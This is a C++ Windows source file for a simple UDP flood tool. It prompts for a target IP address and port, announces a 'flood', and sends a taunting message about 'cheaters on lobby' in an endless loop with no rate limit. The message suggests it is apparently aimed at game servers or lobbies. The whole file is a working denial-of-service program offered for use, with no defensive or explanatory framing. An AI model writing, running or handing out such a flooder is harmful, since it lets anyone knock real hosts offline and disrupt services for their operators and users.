#include <iostream>
#include <winsock2.h>
using namespace std;

#pragma comment(lib,"ws2_32.lib") 
#pragma warning(disable:4996) 
#define BUFLEN 512  

char ip_address[16] = "";
int port = NULL;

class UDPClient {
public:
    UDPClient() 
    {
        if (WSAStartup(MAKEWORD(2, 2), &ws) != 0) 
        {
            cout << "Failed. Error Code: " << WSAGetLastError() << "\n";
            exit(EXIT_FAILURE);
        }
        cout << "Initialized.\n";

        if ((client_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR) 
        {
            cout << "socket() failed with error code: " << WSAGetLastError() << "\n";
            exit(EXIT_FAILURE);
        }

        memset((char*)&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.S_un.S_addr = inet_addr(ip_address);
    }

    ~UDPClient() {
        closesocket(client_socket);
        WSACleanup();
    }

    void start() 
    {
        const char* message = "theres cheaters on lobby ;(!";
        int i = 0;

        while (true) 
        {
            if (sendto(client_socket, message, strlen(message), 0, (sockaddr*)&server, sizeof(sockaddr_in)) == SOCKET_ERROR) 
            {
                cout << "sendto() failed with error code: " << WSAGetLastError() << "\n";
                exit(EXIT_FAILURE);
            }
        }
    }

private:
    WSADATA ws;
    SOCKET client_socket;
    sockaddr_in server;
};

int main()
{
    cout << "ip address (ex: 000.00.00.00):";
    cin >> ip_address;
    cout << endl;
    cout << "port:";
    cin >> port;
    cout << endl;

    cout << "Initializing flood against " << ip_address << ":" << port << endl;

    MoveWindow(GetConsoleWindow(), 50, 50, 500, 500, true);

    UDPClient udpClient;
    udpClient.start();
}
